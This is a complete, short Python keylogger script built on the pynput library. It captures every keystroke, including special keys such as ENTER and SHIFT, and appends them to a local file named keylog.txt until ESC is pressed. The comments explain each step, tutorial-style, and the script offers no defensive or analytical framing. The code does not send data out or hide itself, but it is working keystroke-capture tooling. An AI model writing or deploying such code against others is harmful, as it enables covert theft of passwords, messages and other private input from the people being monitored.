from pynput import keyboard

# The file where we'll store the logged keys
log_file = "keylog.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        # Log the actual character for letters, digits, and symbols
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., SHIFT, SPACE, ENTER, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # Replace space with an actual space
            elif key == keyboard.Key.enter:
                f.write("\n")  # Log ENTER as a new line
            else:
                f.write(f" [{key}] ")  # Log special keys in brackets

# Function to stop the keylogger (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when ESC is pressed
        return False

# Set up the listener for the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start the listener, which will run indefinitely
